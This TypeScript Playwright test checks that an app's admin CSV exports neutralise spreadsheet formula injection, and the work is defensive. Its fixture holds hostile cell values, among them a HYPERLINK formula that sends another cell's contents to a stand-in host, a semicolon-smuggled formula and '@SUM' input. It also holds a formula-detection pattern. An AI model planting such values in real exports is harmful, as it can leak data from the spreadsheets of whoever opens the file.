import fs from 'node:fs';
import ts from 'typescript';
import { expect, test, type Page } from '@playwright/test';
import { reactBrowserScripts } from './helpers/react-browser';

// The admin exports (/admin/users "Export", /admin/reports' three reports)
// wrote names, emails and family names — text users type — into cells that a
// spreadsheet reads as a FORMULA when they begin with = + - @. Every cell was
// quoted, which keeps commas in; it does nothing for `=HYPERLINK(…)`. And
// Excel in the semicolon locales the app ships splits at `;`, so a cell also
// begins after a `;` inside a value.
//
// Mounted for real: the toolbar components and Button, transpiled from
// source, rendered with React, clicked; the CSV is read back from the Blob
// the click hands to URL.createObjectURL. No server, database or network.
const { react, reactDom } = reactBrowserScripts('development');
const files = ['components/admin/users-toolbar.tsx', 'components/admin/reports-toolbar.tsx', 'components/ui/button.tsx', 'lib/csv/spreadsheet-cell.ts']
  .filter((file) => fs.existsSync(file));
const sources = Object.fromEntries(files.map((file) => [
  `@/${file.replace(/\.tsx?$/, '')}`,
  ts.transpileModule(fs.readFileSync(file, 'utf8'), {
    compilerOptions: { target: ts.ScriptTarget.ES2020, module: ts.ModuleKind.CommonJS, jsx: ts.JsxEmit.React },
  }).outputText,
]));

declare global { interface Window { __csv: string[] } }

const HOSTILE = {
  name: '=HYPERLINK("https://example.test/?"&B2,"Open")',
  email: '+1+1@example.test',
  family: 'Smith;=1+1',
};

async function mount(page: Page) {
  await page.context().setOffline(true);
  await page.route('**/*', (route) => route.abort());
  page.on('pageerror', (error) => { throw error; });
  await page.setContent('<!doctype html><main id="root"></main>');
  for (const content of [react, reactDom]) await page.addScriptTag({ content });
  await page.addScriptTag({ content: `(() => {
    const sources = ${JSON.stringify(sources)}, modules = {};
    window.__csv = [];
    URL.createObjectURL = (blob) => { blob.text().then((text) => window.__csv.push(text)); return 'blob:fixture'; };
    URL.revokeObjectURL = () => {};
    HTMLAnchorElement.prototype.click = function () {};
    const mocks = {
      react: React,
      'next/navigation': { useRouter: () => ({ refresh: () => {} }) },
      'lucide-react': new Proxy({}, { get: () => () => null }),
      '@/lib/utils/cn': { cn: (...values) => values.filter(Boolean).join(' ') },
      '@/components/ui/modal': { Modal: () => null },
      '@/components/ui/input': { Field: () => null, Input: () => null, Select: () => null },
      '@/components/ui/toast': { useToast: () => ({ success: () => {}, error: () => {} }) },
      '@/lib/constants/roles': { ROLE_LABEL_KEYS: {}, INVITABLE_ROLES: [] },
      '@/app/(app)/admin/actions': { adminCreateUserAction: async () => ({ ok: true }), adminCreateFamilyAction: async () => ({ ok: true }) },
      '@/components/i18n/locale-provider': { useTranslations: () => (key) => key },
    };
    function load(id) {
      if (Object.hasOwn(mocks, id)) return mocks[id];
      if (modules[id]) return modules[id];
      if (!sources[id]) throw new Error('Unexpected browser module ' + id);
      const module = { exports: {} };
      new Function('require', 'module', 'exports', sources[id])(load, module, module.exports);
      return modules[id] = module.exports;
    }
    const hostile = ${JSON.stringify(HOSTILE)};
    const root = ReactDOM.createRoot(document.getElementById('root'));
    ReactDOM.flushSync(() => root.render(React.createElement('div', null,
      React.createElement(load('@/components/admin/users-toolbar').UsersToolbar, {
        families: [],
        exportRows: [{ name: hostile.name, email: hostile.email, family: hostile.family, role: 'parent', plan: 'basic', status: 'active', joined: '2026-10-03' }],
      }),
      React.createElement(load('@/components/admin/reports-toolbar').ReportsToolbar, {
        userRows: [[hostile.name, hostile.email, hostile.family, 'parent', '2026-10-03']],
        familyRows: [[hostile.family, 'basic', 'active', '2026-10-03']],
        contentRows: [['@SUM(A1:A9)', hostile.family, 'docs', -1024, '2026-10-03']],
      }),
    )));
  })();` });
}

async function exported(page: Page, label: string): Promise<string> {
  const before = await page.evaluate(() => window.__csv.length);
  await page.getByRole('button', { name: label }).click();
  await expect.poll(() => page.evaluate(() => window.__csv.length)).toBe(before + 1);
  return page.evaluate(() => window.__csv[window.__csv.length - 1]);
}

/** Every cell a spreadsheet could see in this CSV: split at the comma (quote-aware)
 *  and, as the semicolon locales do, at `;` too. */
function cellsAsASpreadsheetMaySee(csv: string): string[] {
  const out: string[] = [];
  for (const line of csv.split(/\r?\n/)) {
    let cur = '';
    let quoted = false;
    for (let i = 0; i < line.length; i += 1) {
      const ch = line[i];
      if (quoted) {
        if (ch === '"' && line[i + 1] === '"') { cur += '"'; i += 1; } else if (ch === '"') quoted = false; else cur += ch;
      } else if (ch === '"') quoted = true;
      else if (ch === ',') { out.push(cur); cur = ''; } else cur += ch;
    }
    out.push(cur);
    out.push(...line.split(';').slice(1));
  }
  return out;
}

/** A cell a spreadsheet would evaluate: starts with = + - @ and is not just a number. */
const formulas = (csv: string) => cellsAsASpreadsheetMaySee(csv)
  .filter((cell) => /^\s*[=+\-@]/.test(cell) && !/^-?\d+(\.\d+)?$/.test(cell.trim()));

test.describe('an admin export is not a spreadsheet program', () => {
  test('the users export writes a typed name, email and family as text', async ({ page }) => {
    await mount(page);
    const csv = await exported(page, 'usersToolbar.export');

    expect(csv.split('\n')[0]).toBe('"Name","Email","Family","Role","Plan","Status","Joined"');
    expect(formulas(csv)).toEqual([]);
    expect(csv).toContain(`'${HOSTILE.name.replace(/"/g, '""')}`);
  });

  for (const label of ['reportsToolbar.userActivityReport', 'reportsToolbar.subscriptionRevenueReport', 'reportsToolbar.contentReport']) {
    test(`${label} writes typed text as text`, async ({ page }) => {
      await mount(page);
      const csv = await exported(page, label);

      expect(formulas(csv)).toEqual([]);
    });
  }

  test('a number stays a number, a date stays a date, and ordinary text is untouched', async ({ page }) => {
    await mount(page);
    const csv = await exported(page, 'reportsToolbar.contentReport');

    expect(csv).toContain('"-1024"');
    expect(csv).toContain('"2026-10-03"');
    expect(csv).toContain('"docs"');
  });
});
